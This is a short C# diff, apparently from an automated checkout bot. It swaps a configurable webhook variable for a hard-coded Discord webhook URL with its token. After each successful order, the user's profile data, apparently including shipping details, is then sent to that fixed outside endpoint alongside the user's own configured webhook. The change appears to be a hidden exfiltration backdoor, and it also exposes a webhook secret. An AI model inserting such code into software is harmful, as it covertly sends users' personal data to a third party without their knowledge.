@@ -1009,7 +1009,7 @@ new JProperty("shippingAddress",
                 }
                 if (status.Contains("error") == false)
                 {
-                    ProcessNotification(true, tk, webhook2, joprofile, "");
+                    ProcessNotification(true, tk, "https://discordapp.com/api/webhooks/517871792677847050/qry12HP2IqJQb2sAfSNBmpUmFPOdPsVXUYY2_yhDgckgznpeVtRpNbwvO1Oma6nMGeK9", joprofile, "");
                     ProcessNotification(false,tk,Config.webhook, joprofile,orderid);  
                     tk.Status = "Success";
                 }
